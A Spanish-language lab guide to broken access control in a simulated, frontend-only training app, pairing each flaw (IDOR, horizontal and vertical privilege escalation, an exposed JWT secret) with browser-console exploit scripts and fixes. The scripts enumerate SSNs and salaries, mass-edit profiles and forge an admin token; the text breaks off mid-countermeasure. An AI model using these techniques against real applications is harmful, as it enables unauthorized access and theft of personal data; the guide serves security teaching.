# Gu√≠a Actualizada - Vulnerabilidades Broken Access Control (CFT)

## üìã √çndice de Vulnerabilidades

1. [IDOR - Insecure Direct Object Reference](#1-idor---insecure-direct-object-reference)
2. [Escalada de Privilegios Horizontal](#2-escalada-de-privilegios-horizontal)
3. [Escalada de Privilegios Vertical](#3-escalada-de-privilegios-vertical)
4. [Exposici√≥n de Informaci√≥n Sensible](#4-exposici√≥n-de-informaci√≥n-sensible)
5. [Manipulaci√≥n de Roles y Permisos](#5-manipulaci√≥n-de-roles-y-permisos)
6. [Vulnerabilidades en JWT](#6-vulnerabilidades-en-jwt)

---

## üèóÔ∏è Arquitectura del Sistema CFT

### **‚ö†Ô∏è IMPORTANTE: C√≥mo Funciona el CFT**

El CFT (Centro de Formaci√≥n T√©cnica) **NO tiene un backend real**. Es una aplicaci√≥n completamente frontend que simula vulnerabilidades usando:

- **üìÅ Base de datos simulada**: Array en memoria en `api.ts`
- **üé≠ API simulada**: Funciones que imitan requests HTTP 
- **üîë JWT simulado**: Tokens creados con base64, no criptograf√≠a real
- **‚è±Ô∏è Delays simulados**: Para imitar latencia de red

### **üõ†Ô∏è M√©todos de Explotaci√≥n Disponibles**

#### **‚úÖ FUNCIONAN (Recomendados):**
1. **`window.debugAPI`** - Acceso directo a datos (modo desarrollo)
2. **Navegaci√≥n manual** - Cambiar URLs para acceder a perfiles
3. **Manipulaci√≥n de localStorage** - Modificar tokens y datos de usuario
4. **Interceptaci√≥n en DevTools** - Usar Network tab para ver requests

#### **‚ùå NO FUNCIONAN:**
1. **`fetch()` a endpoints API** - No hay servidor backend real
2. **Requests externos** - Todo es simulaci√≥n local
3. **Bases de datos reales** - Solo arrays en memoria

### **üéØ Para Mejores Resultados:**
- Usa `window.debugAPI` cuando est√© disponible
- Si `debugAPI` no existe, usa m√©todos manuales de navegaci√≥n
- Todos los scripts incluyen m√©todos alternativos de fallback

---

### **Base de Datos Simulada (JSON)**
El sistema utiliza una base de datos simulada en memoria almacenada en `services/api.ts`:

```javascript
let usersDatabase: User[] = [
  {
    id: 1, username: 'admin', role: 'admin',
    profile: { fullName: 'Administrador de sistema', salary: 120000, ssn: '123-45-6789' }
  },
  {
    id: 2, username: 'jaranguiz', role: 'user',
    profile: { fullName: 'Juan Aranguiz Salas', salary: 65000, ssn: '987-65-4321' }
  },
  {
    id: 3, username: 'james', role: 'user',
    profile: { fullName: 'James Blond Von Gonzalez', salary: 70000, ssn: '456-78-9012' }
  },
  {
    id: 4, username: 'rob', role: 'user',
    profile: { fullName: 'Rob Spon Ja', salary: 60000, ssn: '789-01-2345' }
  }
];
```

### **Credenciales de Prueba**
- **Admin**: `admin` / `admin123`
- **Usuario 1**: `jaranguiz` / `user123`
- **Usuario 2**: `james` / `user123`  
- **Usuario 3**: `rob` / `user123`

---

## 1. IDOR - Insecure Direct Object Reference

### üìù **Descripci√≥n**

IDOR ocurre cuando la funci√≥n `getUserById()` permite acceso directo a cualquier usuario bas√°ndose en el ID proporcionado, sin validar autorizaci√≥n.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `getUserById()` en `services/api.ts` (l√≠neas 105-130)
- **Frontend UI**: `/profile/:id` - Componente Profile.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
export const getUserById = async (id: number): Promise<User> => {
  await simulateNetworkDelay();
  
  // Simular verificaci√≥n de token (vulnerable)
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // üö® NO HAY VALIDACI√ìN: Cualquier usuario autenticado puede ver cualquier perfil
  const user = usersDatabase.find(u => u.id === id);
  
  if (!user) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Retornar usuario sin password pero con datos sensibles
  const userWithoutPassword = { ...user };
  delete (userWithoutPassword as any).password;
  
  return userWithoutPassword;
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Manipulaci√≥n de URL en el Frontend**
1. Login como `jaranguiz` (usuario ID: 2)
2. Navegar a `/profile/2` (tu perfil) ‚úÖ
3. Cambiar URL a `/profile/1` ‚ùå - Accede al perfil de admin
4. Cambiar URL a `/profile/3` ‚ùå - Accede al perfil de james
5. Cambiar URL a `/profile/4` ‚ùå - Accede al perfil de rob

#### **M√©todo 2: Manipulaci√≥n Directa en DevTools**
```javascript
// Abrir DevTools ‚Üí Console y ejecutar:

// 1. Verificar tu token actual
console.log('Mi token:', localStorage.getItem('token'));
console.log('Mis datos:', JSON.parse(localStorage.getItem('user') || '{}'));

// 2. M√âTODO PRINCIPAL: Acceso directo a datos via debugAPI
const exploreUsers = () => {
  if (window.debugAPI && window.debugAPI.usersDatabase) {
    console.log("üîç ACCESO DIRECTO A BASE DE DATOS DETECTADO");
    const users = window.debugAPI.usersDatabase;
    
    users.forEach(user => {
      console.log(`
üë§ Usuario ${user.id}: ${user.username}
üìù Nombre: ${user.profile?.fullName}
üí∞ Salario: ${user.profile?.salary?.toLocaleString()}
üÜî SSN: ${user.profile?.ssn}
üìû Tel√©fono: ${user.profile?.phone}
üè¢ Departamento: ${user.profile?.department}
üîê Rol: ${user.role}
      `);
    });
    
    return users;
  } else {
    console.log("‚ùå debugAPI no disponible. M√âTODOS ALTERNATIVOS:");
    console.log("   1. Navegar manualmente a /profile/1, /profile/2, /profile/3, /profile/4");
    console.log("   2. Usar herramientas de red del navegador para interceptar datos");
    console.log("   3. Revisar el c√≥digo fuente en la pesta√±a Sources");
    
    // Mostrar datos disponibles en localStorage
    console.log("üìã Datos en localStorage:", {
      token: localStorage.getItem('token'),
      user: JSON.parse(localStorage.getItem('user') || '{}')
    });
  }
};

// Ejecutar exploraci√≥n
exploreUsers();
```

#### **M√©todo 3: Script Autom√°tico de Enumeraci√≥n**
```javascript
// Script para enumerar todos los usuarios sistem√°ticamente
const enumerateUsers = async () => {
  console.log("üîç INICIANDO ENUMERACI√ìN DE USUARIOS");
  const discoveredUsers = [];
  
  // M√©todo 1: Si debugAPI est√° disponible (modo desarrollo)
  if (window.debugAPI && window.debugAPI.usersDatabase) {
    console.log("üìç Usando debugAPI para acceso directo");
    const users = window.debugAPI.usersDatabase;
    users.forEach(user => {
      discoveredUsers.push({
        id: user.id,
        username: user.username,
        fullName: user.profile?.fullName,
        salary: user.profile?.salary,
        ssn: user.profile?.ssn,
        phone: user.profile?.phone,
        department: user.profile?.department
      });
      console.log(`‚úÖ Usuario ${user.id} encontrado:`, user.username);
    });
  } else {
    // M√©todo 2: Navegaci√≥n manual por URLs
    console.log("üìç debugAPI no disponible. Usa navegaci√≥n manual:");
    console.log("   1. Ve a /profile/1 para ver admin");
    console.log("   2. Ve a /profile/2 para ver jaranguiz");  
    console.log("   3. Ve a /profile/3 para ver james");
    console.log("   4. Ve a /profile/4 para ver rob");
    
    // M√©todo 3: Acceso a datos desde localStorage/sessionStorage
    const userData = localStorage.getItem('user');
    if (userData) {
      console.log("üìã Tu informaci√≥n actual:", JSON.parse(userData));
    }
  }
  
  if (discoveredUsers.length > 0) {
    console.table(discoveredUsers);
  }
  return discoveredUsers;
};

// Ejecutar enumeraci√≥n
enumerateUsers();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Validaci√≥n de Ownership (Nivel B√°sico)**
```javascript
export const getUserById = async (id: number): Promise<User> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // ‚úÖ Validar que el usuario solo pueda acceder a su propio perfil
  if (id !== decoded.id && decoded.role !== 'admin') {
    throw createHttpError(403, 'Acceso denegado: No puedes acceder a este perfil');
  }
  
  const user = usersDatabase.find(u => u.id === id);
  
  if (!user) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  const userWithoutPassword = { ...user };
  delete (userWithoutPassword as any).password;
  
  return userWithoutPassword;
};
```

#### **2. Filtrado de Datos Sensibles**
```javascript
const filterSensitiveData = (userData: User, requestingUser: any) => {
  const baseData = {
    id: userData.id,
    username: userData.username,
    email: userData.email,
    role: userData.role,
    created_at: userData.created_at
  };
  
  // Solo mostrar datos completos al propio usuario o admin
  if (userData.id === requestingUser.id || requestingUser.role === 'admin') {
    return {
      ...baseData,
      profile: userData.profile
    };
  }
  
  // Para otros usuarios, solo informaci√≥n b√°sica
  return {
    ...baseData,
    profile: {
      fullName: userData.profile?.fullName,
      department: userData.profile?.department
      // Salary, SSN, phone no incluidos
    }
  };
};
```

---

## 2. Escalada de Privilegios Horizontal

### üìù **Descripci√≥n**

La funci√≥n `updateUser()` permite a cualquier usuario modificar el perfil de otros usuarios del mismo nivel de privilegios.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `updateUser()` en `services/api.ts` (l√≠neas 132-170)
- **Frontend UI**: Formulario de edici√≥n en Profile.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // üö® NO HAY VALIDACI√ìN: Cualquier usuario puede modificar cualquier perfil
  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Actualizar perfil
  usersDatabase[userIndex].profile = {
    ...usersDatabase[userIndex].profile,
    ...userData
  };

  console.log(`üö® VULNERABILITY EXPLOITED: User ${decoded.username} (ID: ${decoded.id}) modified user ${id}`);
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Interceptar y Modificar via DevTools**

**Usando las herramientas de desarrollador:**
1. Login como `jaranguiz` (ID: 2)
2. Ir al perfil de otro usuario via URL: `/profile/3`
3. Si el formulario de edici√≥n est√° disponible, modificar los datos
4. **O ejecutar directamente en console:**

```javascript
// M√âTODO PR√ÅCTICO: Manipular datos directamente en debugAPI (si est√° disponible)
if (window.debugAPI && window.debugAPI.usersDatabase) {
  console.log("üö® ACCESO DIRECTO A BASE DE DATOS DETECTADO");
  
  // Ver datos actuales del usuario objetivo (James, ID: 3)
  const targetUser = window.debugAPI.usersDatabase.find(u => u.id === 3);
  console.log("üìã Datos originales de James:", targetUser);
  
  // Modificar directamente (simulando escalada horizontal)
  if (targetUser) {
    const originalData = { ...targetUser.profile };
    
    // Realizar modificaci√≥n maliciosa
    targetUser.profile = {
      ...targetUser.profile,
      fullName: "James HACKEADO por " + JSON.parse(localStorage.getItem('user')||'{}').username,
      phone: "+56-555-HACKED",
      department: "Departamento Comprometido"
    };
    
    console.log("‚úÖ Datos modificados exitosamente:");
    console.log("   Original:", originalData);
    console.log("   Modificado:", targetUser.profile);
    console.log("üîÑ Navega a /profile/3 para ver los cambios");
  }
} else {
  console.log("‚ùå debugAPI no disponible. M√©todos alternativos:");
  console.log("   1. Usar herramientas de red del navegador");
  console.log("   2. Modificar datos via formularios de la UI");
  console.log("   3. Buscar endpoints de API expuestos");
}
```

#### **M√©todo 2: Script Masivo de Modificaci√≥n**
```javascript
// Script para modificar m√∫ltiples perfiles usando acceso directo
const modifyAllUsers = async () => {
  if (!window.debugAPI || !window.debugAPI.usersDatabase) {
    console.log("‚ùå debugAPI no disponible. Usar m√©todos manuales.");
    return;
  }
  
  const currentUserData = JSON.parse(localStorage.getItem('user') || '{}');
  console.log(`üö® Atacando desde usuario: ${currentUserData.username}`);
  
  const maliciousUpdate = {
    fullName: "USUARIO HACKEADO",
    phone: "+56-555-PWNED",
    department: "SECURITY BREACH"
  };
  
  window.debugAPI.usersDatabase.forEach(user => {
    if (user.id !== currentUserData.id) {
      const originalData = { ...user.profile };
      
      // Aplicar modificaci√≥n maliciosa
      user.profile = {
        ...user.profile,
        ...maliciousUpdate,
        fullName: maliciousUpdate.fullName + ` (por ${currentUserData.username})`
      };
      
      console.log(`‚úÖ Usuario ${user.id} (${user.username}) modificado:`);
      console.log(`   Antes: ${originalData.fullName}`);
      console.log(`   Despu√©s: ${user.profile.fullName}`);
    } else {
      console.log(`‚è≠Ô∏è Saltando usuario propio (ID: ${user.id})`);
    }
  });
  
  console.log("üèÅ Ataque masivo completado");
  console.log("üîÑ Navega a /admin para ver todos los cambios");
};

// Ejecutar ataque
modifyAllUsers();
```

#### **M√©todo 3: Modificaci√≥n Espec√≠fica de Datos Sensibles**
```javascript
// Manipular salarios espec√≠ficamente usando acceso directo
const manipulateSalaries = () => {
  if (!window.debugAPI || !window.debugAPI.usersDatabase) {
    console.log("‚ùå debugAPI no disponible. M√âTODOS ALTERNATIVOS:");
    console.log("   1. Usar formularios de edici√≥n en la UI");
    console.log("   2. Interceptar requests en Network tab");
    console.log("   3. Modificar datos via /admin si est√° accesible");
    return;
  }
  
  const users = window.debugAPI.usersDatabase;
  const salaryUpdates = [
    { id: 1, salary: 50000, reason: "Reducir salario del admin" },
    { id: 3, salary: 150000, reason: "Aumentar salario de James" },
    { id: 4, salary: 200000, reason: "Aumentar salario de Rob" }
  ];
  
  salaryUpdates.forEach(update => {
    const user = users.find(u => u.id === update.id);
    if (user && user.profile) {
      const oldSalary = user.profile.salary;
      user.profile.salary = update.salary;
      
      console.log(`üí∞ ${update.reason}:`);
      console.log(`   Usuario: ${user.username} (${user.profile.fullName})`);
      console.log(`   Salario anterior: ${oldSalary?.toLocaleString()}`);
      console.log(`   Salario nuevo: ${update.salary.toLocaleString()}`);
    }
  });
  
  console.log("üèÅ Manipulaci√≥n de salarios completada");
  console.log("üîÑ Ve a /admin para verificar los cambios");
};

// Ejecutar manipulaci√≥n
manipulateSalaries();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Validaci√≥n de Ownership Estricta**
```javascript
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // ‚úÖ Solo el propietario o admin puede modificar
  if (id !== decoded.id && decoded.role !== 'admin') {
    throw createHttpError(403, 'Forbidden: No puedes modificar datos de otros usuarios');
  }
  
  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Actualizar perfil
  usersDatabase[userIndex].profile = {
    ...usersDatabase[userIndex].profile,
    ...userData
  };

  console.log(`‚úÖ User ${decoded.username} successfully updated user ${id}`);
};
```

#### **2. Logging y Auditor√≠a**
```javascript
const securityLog: any[] = [];

const logSecurityEvent = (event: string, user: any, target: any, details: any) => {
  const logEntry = {
    timestamp: new Date().toISOString(),
    event,
    user_id: user.id,
    username: user.username,
    user_role: user.role,
    target_user_id: target,
    details,
    suspicious: user.id !== target && user.role !== 'admin'
  };
  
  securityLog.push(logEntry);
  
  if (logEntry.suspicious) {
    console.warn('üö® SECURITY ALERT: Unauthorized access attempt', logEntry);
  }
  
  return logEntry;
};

// Integrar en updateUser
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  // ... validaciones previas
  
  // Log del evento
  logSecurityEvent('user_profile_update', decoded, id, userData);
  
  // ... resto del c√≥digo
};
```

---

## 3. Escalada de Privilegios Vertical

### üìù **Descripci√≥n**

La funci√≥n `getAllUsers()` permite a usuarios normales acceder a funciones administrativas sin verificar el rol de administrador.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `getAllUsers()` en `services/api.ts` (l√≠neas 174-200)
- **Frontend UI**: `/admin` - Componente AdminPanel.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
export const getAllUsers = async (): Promise<User[]> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // üö® FALLA: No verifica si es admin
  console.log(`üö® VULNERABILITY EXPLOITED: User ${decoded.username} (role: ${decoded.role}) accessed admin user list`);

  // Retornar usuarios sin passwords pero con datos sensibles
  return usersDatabase.map(user => {
    const userWithoutPassword = { ...user };
    delete (userWithoutPassword as any).password;
    return userWithoutPassword;
  });
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Acceso Directo a Panel Admin**
1. Login como usuario normal (`jaranguiz`)
2. Navegar directamente a `/admin` en el frontend
3. La interfaz se carga y muestra todos los usuarios con datos sensibles

#### **M√©todo 2: Llamada Directa a la Funci√≥n**
```javascript
// M√âTODO PR√ÅCTICO: Acceder a datos administrativos
const accessAdminData = () => {
  if (window.debugAPI && window.debugAPI.usersDatabase) {
    console.log("üö® ACCESO NO AUTORIZADO A DATOS ADMINISTRATIVOS:");
    console.log("üíæ Base de datos completa accesible via debugAPI");
    
    const users = window.debugAPI.usersDatabase;
    console.log(`üìä Total de usuarios encontrados: ${users.length}`);
    
    users.forEach(user => {
      console.log(`
üë§ Usuario: ${user.username}
üìß Email: ${user.email}
üè¢ Rol: ${user.role}
üí∞ Salario: ${user.profile?.salary?.toLocaleString()}
üÜî SSN: ${user.profile?.ssn}
üìû Tel√©fono: ${user.profile?.phone}
üè¢ Departamento: ${user.profile?.department}
      `);
    });
    
    return users;
  } else {
    console.log("‚ùå debugAPI no disponible en producci√≥n");
    console.log("üîÑ Alternativamente:");
    console.log("   1. Navega a /admin para ver interfaz administrativa");
    console.log("   2. Usa herramientas de red para interceptar requests");
    console.log("   3. Revisa localStorage/sessionStorage para datos cacheados");
    
    // Verificar datos en localStorage
    const userData = localStorage.getItem('user');
    if (userData) {
      console.log("üìã Datos de usuario en localStorage:", JSON.parse(userData));
    }
  }
};

// Ejecutar acceso administrativo
accessAdminData();
```

#### **M√©todo 3: Extracci√≥n Masiva de Datos**
```javascript
// Script para extraer y procesar todos los datos administrativos
const extractAllAdminData = () => {
  if (!window.debugAPI || !window.debugAPI.usersDatabase) {
    console.log("‚ùå debugAPI no disponible. Usar m√©todos alternativos:");
    console.log("   1. Navegaci√≥n manual a /admin");
    console.log("   2. Inspecci√≥n de Network tab en DevTools");
    console.log("   3. An√°lisis de datos en localStorage");
    return null;
  }
  
  const users = window.debugAPI.usersDatabase;
  
  // Crear resumen ejecutivo
  const adminSummary = {
    total_users: users.length,
    admin_count: users.filter(u => u.role === 'admin').length,
    total_payroll: users.reduce((sum, u) => sum + (u.profile?.salary || 0), 0),
    departments: [...new Set(users.map(u => u.profile?.department))],
    sensitive_data: {
      ssns: users.map(u => ({ name: u.profile?.fullName, ssn: u.profile?.ssn })),
      phones: users.map(u => ({ name: u.profile?.fullName, phone: u.profile?.phone })),
      salaries: users.map(u => ({ name: u.profile?.fullName, salary: u.profile?.salary }))
    }
  };
  
  console.log("üìä RESUMEN ADMINISTRATIVO EXTRA√çDO:");
  console.table(adminSummary);
  
  // Guardar en variable global para acceso posterior
  window.extractedData = adminSummary;
  
  // Mostrar informaci√≥n cr√≠tica
  console.log("üö® INFORMACI√ìN CR√çTICA EXTRA√çDA:");
  console.log("üí∞ N√≥mina total: $" + adminSummary.total_payroll.toLocaleString());
  console.log("üë• Administradores:", users.filter(u => u.role === 'admin').map(u => u.username));
  console.log("üè¢ Departamentos:", adminSummary.departments);
  
  return adminSummary;
};

// Ejecutar extracci√≥n
extractAllAdminData();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Validaci√≥n de Rol de Administrador**
```javascript
export const getAllUsers = async (): Promise<User[]> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // ‚úÖ Verificar rol de administrador
  if (decoded.role !== 'admin') {
    console.warn(`üö® Unauthorized admin access attempt by user: ${decoded.username} (Role: ${decoded.role})`);
    throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
  }

  console.log(`‚úÖ Admin access granted to user: ${decoded.username}`);

  return usersDatabase.map(user => {
    const userWithoutPassword = { ...user };
    delete (userWithoutPassword as any).password;
    return userWithoutPassword;
  });
};
```

#### **2. Sistema de Permisos Granular**
```javascript
// Definir permisos espec√≠ficos
const PERMISSIONS = {
  'users.read_all': ['admin'],
  'users.read_own': ['admin', 'user'],
  'users.write_any': ['admin'],
  'users.write_own': ['admin', 'user'],
  'users.delete': ['admin'],
  'system.read': ['admin']
};

const hasPermission = (userRole: string, permission: string): boolean => {
  return PERMISSIONS[permission]?.includes(userRole) || false;
};

const requirePermission = (permission: string) => {
  return (decoded: any) => {
    if (!hasPermission(decoded.role, permission)) {
      throw createHttpError(403, `Acceso denegado: Se requiere permiso '${permission}'`);
    }
  };
};

// Uso en getAllUsers
export const getAllUsers = async (): Promise<User[]> => {
  // ... validaciones b√°sicas
  
  // ‚úÖ Verificar permiso espec√≠fico
  requirePermission('users.read_all')(decoded);
  
  // ... resto del c√≥digo
};
```

---

## 4. Exposici√≥n de Informaci√≥n Sensible

### üìù **Descripci√≥n**

La funci√≥n `getSystemInfo()` expone informaci√≥n cr√≠tica del sistema, incluyendo el JWT secret, a cualquier usuario autenticado.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `getSystemInfo()` en `services/api.ts` (l√≠neas 256-285)
- **Frontend UI**: `/system` - Componente SystemInfo.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
const SYSTEM_CONFIG = {
  jwt_secret: 'vulnerable-secret-key', // üö® Secret expuesta
  server_info: 'Ubuntu 20.04',
  database_info: 'JSON Local Storage',
  debug_mode: true,
  last_backup: '2024-01-15',
  admin_users: ['admin'],
  total_users: usersDatabase.length
};

export const getSystemInfo = async (): Promise<SystemInfo> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // üö® CUALQUIER usuario autenticado puede acceder
  console.log(`üö® VULNERABILITY EXPLOITED: User ${decoded.username} accessed system info including JWT secret`);

  return {
    server: SYSTEM_CONFIG.server_info,
    database: SYSTEM_CONFIG.database_info,
    users_count: usersDatabase.length,
    admin_users: SYSTEM_CONFIG.admin_users,
    secret_key: SYSTEM_CONFIG.jwt_secret, // üö® MUY VULNERABLE
    last_backup: SYSTEM_CONFIG.last_backup,
    debug_mode: SYSTEM_CONFIG.debug_mode
  };
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Acceso Directo a System Info**
```javascript
// M√âTODO PR√ÅCTICO: Acceder a configuraci√≥n del sistema
const accessSystemInfo = () => {
  if (window.debugAPI && window.debugAPI.SYSTEM_CONFIG) {
    console.log("üö® INFORMACI√ìN CR√çTICA DEL SISTEMA OBTENIDA:");
    const config = window.debugAPI.SYSTEM_CONFIG;
    
    console.log("üîë JWT Secret:", config.jwt_secret);
    console.log("üë• Usuarios Admin:", config.admin_users);
    console.log("üñ•Ô∏è Servidor:", config.server_info);
    console.log("üíæ Base de datos:", config.database_info);
    console.log("üêõ Modo debug:", config.debug_mode);
    console.log("üíæ √öltimo backup:", config.last_backup);
    console.log("üìä Total usuarios:", config.total_users);
    
    // Guardar secret para uso posterior
    window.stolenSecret = config.jwt_secret;
    
    console.log("üí£ IMPACTO: Con esta informaci√≥n puedes:");
    console.log("   1. Forjar tokens JWT v√°lidos");
    console.log("   2. Identificar cuentas administrativas");
    console.log("   3. Entender la arquitectura del sistema");
    console.log("   4. Planificar ataques m√°s sofisticados");
    
    return config;
  } else {
    console.log("‚ùå debugAPI no disponible. Intentar m√©todos alternativos:");
    console.log("   1. Navegar a /system si existe endpoint");
    console.log("   2. Revisar c√≥digo fuente en DevTools");
    console.log("   3. Interceptar requests de red");
    console.log("   4. Buscar archivos de configuraci√≥n expuestos");
    
    // Buscar datos en localStorage que puedan revelar configuraci√≥n
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      console.log(`üìã localStorage[${key}]:`, value);
    }
  }
};

// Ejecutar acceso a system info
accessSystemInfo();
```

#### **M√©todo 2: Forjado de JWT con Secret Robada**
```javascript
// Una vez obtenida la JWT secret, crear tokens falsos
const createMaliciousToken = () => {
  // Verificar si tenemos acceso a la secret
  let stolenSecret = null;
  
  if (window.debugAPI && window.debugAPI.SYSTEM_CONFIG) {
    stolenSecret = window.debugAPI.SYSTEM_CONFIG.jwt_secret;
  } else if (window.stolenSecret) {
    stolenSecret = window.stolenSecret;
  } else {
    stolenSecret = 'vulnerable-secret-key'; // Secret conocida del c√≥digo
  }
  
  console.log("üîë Usando JWT secret:", stolenSecret);
  
  // Crear payload malicioso
  const maliciousPayload = {
    id: 999,
    username: 'super_hacker',
    email: 'hacker@evil.com',
    role: 'admin',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60) // 1 a√±o
  };
  
  // Simular creaci√≥n de JWT (versi√≥n simplificada como en el c√≥digo original)
  const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const payload = btoa(JSON.stringify(maliciousPayload));
  const signature = btoa(`signature_with_${stolenSecret}`);
  
  const fakeToken = `${header}.${payload}.${signature}`;
  
  console.log("üö® TOKEN FALSO CREADO:", fakeToken);
  
  // Mostrar c√≥mo usar el token
  console.log("üí£ PARA USAR EL TOKEN FALSO:");
  console.log("   1. localStorage.setItem('token', '" + fakeToken + "');");
  console.log("   2. localStorage.setItem('user', '" + JSON.stringify(maliciousPayload) + "');");
  console.log("   3. Recarga la p√°gina");
  
  // Guardar para uso f√°cil
  window.maliciousToken = fakeToken;
  window.maliciousPayload = maliciousPayload;
  
  console.log("‚úÖ Token guardado en window.maliciousToken para uso posterior");
  
  return fakeToken;
};

// Funci√≥n helper para aplicar el token falso
const applyMaliciousToken = () => {
  if (window.maliciousToken && window.maliciousPayload) {
    localStorage.setItem('token', window.maliciousToken);
    localStorage.setItem('user', JSON.stringify(window.maliciousPayload));
    console.log("‚úÖ Token falso aplicado. Recarga la p√°gina para usar credenciales falsas.");
  } else {
    console.log("‚ùå Ejecuta createMaliciousToken() primero");
  }
};

// Ejecutar creaci√≥n de token falso
createMaliciousToken();

// Para aplicar: applyMaliciousToken();
```

#### **M√©todo 3: An√°lisis Completo del Sistema**
```javascript
// Script para recopilar toda la informaci√≥n disponible
const fullSystemAnalysis = async () => {
  try {
    // 1. Obtener informaci√≥n del sistema
    const systemInfo = await api.getSystemInfo();
    
    // 2. Obtener lista completa de usuarios
    const allUsers = await api.getAllUsers();
    
    // 3. Compilar an√°lisis completo
    const analysisReport = {
      timestamp: new Date().toISOString(),
      attacker: api.decodeCurrentToken(),
      system: {
        secret_exposed: systemInfo.secret_key,
        debug_enabled: systemInfo.debug_mode,
        backup_date: systemInfo.last_backup,
        admin_list: systemInfo.admin_users
      },
      users: {
        total: allUsers.length,
        admins: allUsers.filter(u => u.role === 'admin'),
        regular_users: allUsers.filter(u => u.role === 'user'),
        total_payroll: allUsers.reduce((sum, u) => sum + (u.profile?.salary || 0), 0),
        sensitive_data: allUsers.map(u => ({
          id: u.id,
          name: u.profile?.fullName,
          ssn: u.profile?.ssn,
          salary: u.profile?.salary,
          phone: u.profile?.phone
        }))
      },
      recommendations: [
        "JWT Secret completamente comprometida",
        "Todos los datos de usuarios accesibles",
        "Sistema completamente vulnerable",
        "Posible creaci√≥n de tokens administrativos falsos"
      ]
    };
    
    console.log("üìä AN√ÅLISIS COMPLETO DEL SISTEMA:");
    console.log(analysisReport);
    
    // Guardar para referencia
    (window as any).systemAnalysis = analysisReport;
    
    return analysisReport;
    
  } catch (error) {
    console.log("‚ùå Error en an√°lisis:", error.message);
  }
};

// Ejecutar an√°lisis completo
fullSystemAnalysis();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Separaci√≥n de Configuraci√≥n Sensible**
```javascript
// Configuraci√≥n p√∫blica vs sensible
const PUBLIC_SYSTEM_CONFIG = {
  app_name: 'CFT Demo App',
  version: '1.0.0',
  environment: 'development',
  features: ['user_profiles', 'admin_panel']
};

const PRIVATE_SYSTEM_CONFIG = {
  jwt_secret: process.env.JWT_SECRET || 'should-be-from-env',
  database_connection: 'sensitive-connection-string',
  api_keys: {
    third_party_service: 'secret-api-key'
  }
};

export const getSystemInfo = async (): Promise<SystemInfo> => {
  // ... validaciones
  
  // ‚úÖ Solo informaci√≥n p√∫blica disponible para usuarios normales
  if (decoded.role !== 'admin') {
    return {
      ...PUBLIC_SYSTEM_CONFIG,
      status: 'operational',
      uptime: Date.now() - startTime // Info no sensible
    };
  }
  
  // ‚úÖ Informaci√≥n adicional solo para admins (pero sin secretos)
  return {
    ...PUBLIC_SYSTEM_CONFIG,
    users_count: usersDatabase.length,
    last_backup: SYSTEM_CONFIG.last_backup,
    debug_mode: SYSTEM_CONFIG.debug_mode,
    // ‚ùå NUNCA incluir: jwt_secret, passwords, api_keys
  };
};
```

#### **2. Anonimizaci√≥n y Filtrado**
```javascript
const sanitizeSystemInfo = (info: any, userRole: string) => {
  const baseInfo = {
    status: 'operational',
    version: info.version,
    features: info.features
  };
  
  if (userRole === 'admin') {
    return {
      ...baseInfo,
      users_count: info.users_count,
      server_stats: {
        uptime: info.uptime,
